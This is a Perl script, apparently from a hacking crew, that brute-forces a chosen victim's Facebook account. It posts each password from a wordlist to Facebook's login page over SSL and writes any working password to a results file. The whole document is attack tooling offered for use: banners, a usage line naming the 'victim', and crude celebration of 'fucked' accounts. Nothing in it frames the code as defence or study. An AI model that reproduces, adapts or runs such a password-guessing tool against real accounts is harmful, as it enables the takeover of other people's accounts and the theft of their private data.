#!/usr/bin/perl
#Facebook Brute-Force script by Exploit
#After a certain amount of tries you might recieve "You are trying to often, Please try again later"!
use IO::Select;
use HTTP::Response;
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
use Term::ANSIColor qw(:constants);
use MIME::Base64;
use LWP;
use HTTP::Cookies;
use HTML::Entities;
use URI::Escape;
use Win32::Console::ANSI;
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use LWP::UserAgent;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);
$ag = LWP::UserAgent->new();
use MIME::Base64;
my $datetime    = localtime;
use strict;
use Net::SSLeay::Handle;

if(!defined($ARGV[0] && $ARGV[1])) {

	system ("title mandra crew face-fucker V2");
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n";print color('reset');
print colored ("                               [ elZinDYanII-tN ]                              ",'white on_red'),"\n";print color('reset');
print colored ("                       [ c0d3d bY ManDra creW membere ]                        ",'white on_red'),"\n";print color('reset');
print colored ("                               [ Version 2 baby ]                             ",'white on_red'),"\n";print color('reset');
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n";	print color('reset');									
print colored ("\n                     ___ ___ _____ _______ __          __                    ",'green on_black'),"\n";print color('reset');
print colored ("                    |   Y   | _   |   _   |  |--.-----|  |_                    ",'green on_black'),"\n";print color('reset');
print colored ("                    |.      |.|   |___|   |  _  |  _  |   _|                   ",'green on_black'),"\n";print color('reset');
print colored ("                    |. |_|  `-|.  |_(__   |_____|_____|____|                   ",'green on_black'),"\n";print color('reset');
print colored ("                    |:  |   | |:  |:  1   |  mandra crew                       ",'green on_black'),"\n";print color('reset');
print colored ("                    |::.|:. | |::.|::.. . |  face-fucker                       ",'green on_black'),"\n";print color('reset');
print colored ("                    `--- ---' `---`-------'      v2                            ",'green on_black'),"\n\n"; print color('reset');                           
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n";print color('reset');
print colored ("                                  [ thnx f0r ]                                 ",'white on_red'),"\n";print color('reset');
print colored ("            [ Spawn_Z | The Poet of FallaGa  | pedro vortex | adminet ]        ",'white on_red'),"\n";print color('reset');
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n\n";print color('reset');
print colored ("                       Start At $datetime                                      ",'white on_black'),"\n";print color('reset');
print colored ("           ======================================================\n            ",'white on_red'),"\n";print color('reset');
print colored ("           #     USAGE: perl Face13.pl victim passwords.txt     #\n            ",'black on_red'),"\n";print color('reset');
print colored ("           ======================================================\n            ",'white on_red'),"\n";print color('reset');
exit; }

my $user = $ARGV[0];
my $passlist = $ARGV[1];

open (LIST, $passlist) || die "\nCannnot find wordlist $passlist \n";

	system ("title mandra crew face-fucker V2");
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n";print color('reset');
print colored ("                               [ elZinDYanII-tN ]                              ",'white on_red'),"\n";print color('reset');
print colored ("                       [ c0d3d bY ManDra creW membere ]                        ",'white on_red'),"\n";print color('reset');
print colored ("                               [ Version 2 baby ]                             ",'white on_red'),"\n";print color('reset');
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n";	print color('reset');									
print colored ("\n                     ___ ___ _____ _______ __          __                    ",'green on_black'),"\n";print color('reset');
print colored ("                    |   Y   | _   |   _   |  |--.-----|  |_                    ",'green on_black'),"\n";print color('reset');
print colored ("                    |.      |.|   |___|   |  _  |  _  |   _|                   ",'green on_black'),"\n";print color('reset');
print colored ("                    |. |_|  `-|.  |_(__   |_____|_____|____|                   ",'green on_black'),"\n";print color('reset');
print colored ("                    |:  |   | |:  |:  1   |  mandra crew                       ",'green on_black'),"\n";print color('reset');
print colored ("                    |::.|:. | |::.|::.. . |  face-fucker                       ",'green on_black'),"\n";print color('reset');
print colored ("                    `--- ---' `---`-------'      v2                            ",'green on_black'),"\n\n"; print color('reset');                           
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n";print color('reset');
print colored ("                                  [ thnx f0r ]                                 ",'white on_red'),"\n";print color('reset');
print colored ("            [ Spawn_Z | The Poet of FallaGa  | pedro vortex | adminet ]        ",'white on_red'),"\n";print color('reset');
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n\n";print color('reset');
print colored ("                       Start At $datetime                                      ",'white on_black'),"\n";print color('reset');
while (my $password = <LIST>) {
chomp ($password);
$password =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;

my $a = "POST /login.php HTTP/1.1";
my $b = "Host: www.facebook.com";
my $c = "Connection: close";
my $e = "Cache-Control: max-age=0";
my $f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
my $g = "Origin: https://www.facebook.com";
my $h = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31";
my $i = "Content-Type: application/x-www-form-urlencoded";
my $j = "Accept-Encoding: gzip,deflate,sdch";
my $k = "Accept-Language: en-US,en;q=0.8";
my $l = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3";

my $cookie = "cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa";
my $post = "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=$user&pass=$password&default_persistent=0&login=Log+In";
my $cl = length($post);
my $d = "Content-Length: $cl";


my ($host, $port) = ("www.facebook.com", 443);

tie(*SSL, "Net::SSLeay::Handle", $host, $port);
  

print SSL "$a\n";
print SSL "$b\n";
print SSL "$c\n";
print SSL "$d\n";
print SSL "$e\n";
print SSL "$f\n";
print SSL "$g\n";
print SSL "$h\n";
print SSL "$i\n";
print SSL "$j\n";
print SSL "$k\n";
print SSL "$l\n";
print SSL "$cookie\n\n";

print SSL "$post\n";

my $success;
while(my $result = <SSL>){
if($result =~ /Location(.*?)/){
$success = $1;
}
}
if (!defined $success)
{
print "[-]";print color("bold green"), "[- Failed -]....";     
print color('reset');
print " $password\n";
}
else
{
my $win1="#####################################################################";
my $win2="#########################   fucked acnnt   ##########################";
my $win3="#####################################################################";
my $win4="#####################################################################";
print "[+]";print color("bold red"), "[- fucked -]....";     
print color('reset');
print " $password\n";
open(save, '>>result.txt');
print save "$win1/n$win2/n$win3/n$user\n$password/n$win4/n";
close(save);
close SSL;
exit;
}
}